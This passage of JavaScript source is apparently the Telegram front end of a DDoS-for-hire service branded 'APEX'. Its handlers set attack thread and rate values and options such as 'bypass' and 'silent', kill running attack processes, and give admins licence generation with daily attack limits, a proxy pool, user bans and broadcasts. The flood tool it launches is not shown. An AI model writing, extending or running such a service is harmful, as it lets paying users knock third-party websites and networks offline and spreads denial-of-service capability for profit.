    }

    // ---- defaults ----
    if (data === 'def_threads') {
        const st = userState.get(chatId);
        if (!st) return ans('Session expired');
        st.data.threads = 40;
        st.step = 'attack_rate';
        return edit(`⚡ Rate (1 - ${CONFIG.HARD_MAX_RATE}):`, {
            inline_keyboard: [[{ text: 'Use default (64)', callback_data: 'def_rate' }]]
        });
    }
    if (data === 'def_rate') {
        const st = userState.get(chatId);
        if (!st) return ans('Session expired');
        st.data.rate = 64;
        st.data.options = { bypass: true, redirect: false, origin: false, cookies: false, silent: true, version: '2' };
        st.step = 'attack_options';
        return edit('🔧 Configure options:', attackOptionsKeyboard(st.data));
    }

    // ---- stop attack ----
    if (data.startsWith('stop_')) {
        const id = parseInt(data.slice(5));
        const a = activeAttacks.get(id);
        if (!a) return ans('Attack not found');
        if (a.userId !== userId && !isAdmin(userId)) return ans('Permission denied');
        try { a.proc.kill('SIGKILL'); } catch {}
        return ans(`🛑 Attack #${id} stopped`);
    }

    // ---- admin only below ----
    if (!isAdmin(userId)) return ans('Access denied');

    if (data === 'adm_stats') {
        return edit(
            `📊 *Bot Stats*\n\n` +
            `👥 Users: ${Object.keys(users).length}\n` +
            `🔑 Licenses: ${Object.keys(licenses).length}\n` +
            `⚡ Active attacks: ${activeAttacks.size}\n` +
            `🔥 Total attacks: ${stats.totalAttacks}\n` +
            `💾 RAM: ${Math.round(process.memoryUsage().rss / 1048576)} MB\n` +
            `⏱ Uptime: ${Math.floor(process.uptime() / 60)}m`,
            adminMenuKeyboard()
        );
    }

    if (data === 'adm_users') {
        const ids = Object.keys(users);
        if (!ids.length) return edit('No users yet.', adminMenuKeyboard());
        let txt = '👥 *Users (last 25)*\n\n';
        ids.slice(-25).forEach(id => {
            const u = users[id];
            const st = u.banned ? '🚫' : (isLicensed(id) ? '✅' : '❌');
            resetDailyIfNeeded(u);
            txt += `${st} \`${id}\` ${u.username ? '@' + esc(u.username) : esc(u.firstName || '')} — ${u.daily?.count ?? 0}\n`;
        });
        return edit(txt, adminMenuKeyboard());
    }

    if (data === 'adm_gen_license') {
        userState.set(chatId, { step: 'adm_lic_days', data: {} });
        return edit('📅 Access duration (days):');
    }

    if (data === 'adm_licenses') {
        const keys = Object.keys(licenses);
        if (!keys.length) return edit('No licenses yet.', adminMenuKeyboard());
        let txt = '📋 *Licenses (last 10)*\n\n';
        keys.slice(-10).forEach(k => {
            const l = licenses[k];
            txt += `\`${k}\`\n📅 ${l.durationDays}d | 👥 ${l.usedCount}/${l.maxUses === 9999 ? '∞' : l.maxUses} | 📊 ${l.dailyLimit ?? 5}/day | ⏳ ${l.cooldownSeconds ?? 60}s\n\n`;
        });
        return edit(txt, adminMenuKeyboard());
    }

    if (data === 'adm_stop_all') {
        let n = 0;
        for (const a of activeAttacks.values()) { try { a.proc.kill('SIGKILL'); n++; } catch {} }
        return ans(`🛑 Stopped ${n} attack(s)`);
    }

    if (data === 'adm_proxies_add') {
        userState.set(chatId, { step: 'adm_proxies', data: { mode: 'add' } });
        return edit('➕ *Add Proxies*\n\nSend `host:port`, one per line.\nNew proxies will be *merged* into the existing pool.');
    }

    if (data === 'adm_proxies_replace') {
        userState.set(chatId, { step: 'adm_proxies', data: { mode: 'replace' } });
        return edit('♻️ *Replace Proxies*\n\n⚠️ This will *wipe* the existing pool and use only what you send.\n\nSend `host:port`, one per line:');
    }

    if (data === 'adm_proxies_count') {
        let count = 0, size = 0;
        try {
            const raw = fs.readFileSync(FILES.proxies, 'utf8');
            const lines = raw.split('\n').map(l => l.trim()).filter(Boolean);
            count = lines.length;
            size = Buffer.byteLength(raw);
        } catch {}
        return edit(
            `📈 *Proxy Pool*\n\n` +
            `🔢 Total proxies: *${count}*\n` +
            `💾 File size: ${(size/1024).toFixed(2)} KB\n` +
            `📁 Path: \`data/proxies.txt\``,
            adminMenuKeyboard()
        );
    }

    if (data === 'adm_broadcast') {
        userState.set(chatId, { step: 'adm_broadcast', data: {} });
        return edit('📢 Send broadcast message:');
    }

    if (data === 'adm_ban')        { userState.set(chatId, { step: 'adm_ban',       data: {} }); return edit('🚫 Numeric user ID to ban:'); }
    if (data === 'adm_unban')      { userState.set(chatId, { step: 'adm_unban',     data: {} }); return edit('✅ Numeric user ID to unban:'); }
    if (data === 'adm_reset_cd')   { userState.set(chatId, { step: 'adm_reset_cd',  data: {} }); return edit('♻️ Numeric user ID to reset cooldown:'); }
    if (data === 'adm_add_admin')  { userState.set(chatId, { step: 'adm_add_admin', data: {} }); return edit('👤 Numeric user ID to promote:'); }
    if (data === 'adm_rm_admin')   { userState.set(chatId, { step: 'adm_rm_admin',  data: {} }); return edit('🗑 Numeric user ID to demote:'); }

    // ---- license uses buttons ----
    if (data.startsWith('lic_uses_')) {
        const st = userState.get(chatId);
        if (!st || st.step !== 'adm_lic_uses') return ans('Session expired');
        st.data.uses = data === 'lic_uses_inf' ? 9999 : parseInt(data.replace('lic_uses_', ''));
        st.step = 'adm_lic_daily';
        return edit('📊 Daily attack limit for this license (1 - 1000):');
    }
});

// =============================================================
//  BOOT
// =============================================================
bot.sendMessage(CONFIG.OWNER_ID,
    `✅ *APEX Bot Online*\n\n` +
    `⚡ RAM: ${Math.round(process.memoryUsage().rss / 1048576)} MB\n` +
    `👥 Users: ${Object.keys(users).length}\n` +
    `🔑 Licenses: ${Object.keys(licenses).length}`,
    { parse_mode: 'Markdown' }
).catch(() => {});

process.on('uncaughtException',  e => console.error('[uncaught]', e.message));
process.on('unhandledRejection', e => console.error('[rejection]', (e && e.message) || e));

console.log('🤖 APEX bot started. Owner:', CONFIG.OWNER_ID);